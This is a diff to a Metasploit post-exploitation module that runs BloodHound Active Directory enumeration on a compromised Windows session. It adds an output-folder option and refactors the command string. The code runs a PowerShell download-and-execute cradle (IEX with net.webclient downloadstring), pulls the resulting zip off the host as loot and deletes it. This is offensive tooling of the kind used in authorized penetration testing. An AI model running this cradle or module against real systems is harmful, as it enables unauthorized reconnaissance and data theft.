@@ -37,6 +37,7 @@ class MetasploitModule < Msf::Post
       OptBool.new('SkipPing', [ false, 'Skip all ping checks for computers. This option will most likely be slower as API calls will be made to all computers regardless of being up Use this option if ping is disabled on the network for some reason', false]),
       OptInt.new('LoopDelay', [ true, 'Amount of time to wait between session enumeration loops in minutes. This option should be used in conjunction with the SessionLoop enumeration method.', 300]),
       OptString.new('MaxLoopTime', [ false, 'Length of time to run looped session collection. Format: 0d0h0m0s or any variation of this format. Use in conjunction with -CollectionMethod SessionLoop. Default will loop for two hours']),
+      OptPath.new('JSONFolder', [ false, 'Folder to write json output to.  Default is Windows temp'])
     ])
 
   end
@@ -95,9 +96,11 @@ class MetasploitModule < Msf::Post
       extra_params += "-MaxLoopTime #{datastore['MaxLoopTime']} "
     end
 
-    tmp_path = get_env('TEMP')
-    print_status("Invoking BloodHound with: Invoke-BloodHound -CollectionMethod #{datastore['CollectionMethod']} -Threads #{datastore['Threads']} -JSONFolder \"#{tmp_path}\" -PingTimeout #{datastore['PingTimeout']} -LoopDelay #{datastore['LoopDelay']} #{extra_params}")
-    process, _pid, _c = execute_script("IEX (new-object net.webclient).downloadstring('#{uri}'); Invoke-BloodHound -CollectionMethod #{datastore['CollectionMethod']} -Threads #{datastore['Threads']} -JSONFolder \"#{tmp_path}\" -PingTimeout #{datastore['PingTimeout']} -LoopDelay #{datastore['LoopDelay']} #{extra_params}")
+    tmp_path = datastore['JSONFolder'] ? datastore['JSONFolder'] : get_env('TEMP')
+
+    invoker = "Invoke-BloodHound -CollectionMethod #{datastore['CollectionMethod']} -Threads #{datastore['Threads']} -JSONFolder \"#{tmp_path}\" -PingTimeout #{datastore['PingTimeout']} -LoopDelay #{datastore['LoopDelay']} #{extra_params}"
+    print_status("Invoking BloodHound with: #{invoker}")
+    process, _pid, _c = execute_script("IEX (new-object net.webclient).downloadstring('#{uri}'); #{invoker}")
 
     while (line = process.channel.read)
         line.split("\n").map { |s| print_status(s) }
@@ -107,7 +110,7 @@ class MetasploitModule < Msf::Post
           zip_path = m[1]
           p = store_loot("windows.ad.bloodhound", "application/zip", session, read_file(zip_path), filename=nil, info=nil, service=nil)
           rm_f(zip_path)
-          print_good("Downloaded #{zip_path}: #{p.to_s}")
+          print_good("Downloaded #{zip_path}: #{p}")
           break
         end
     end
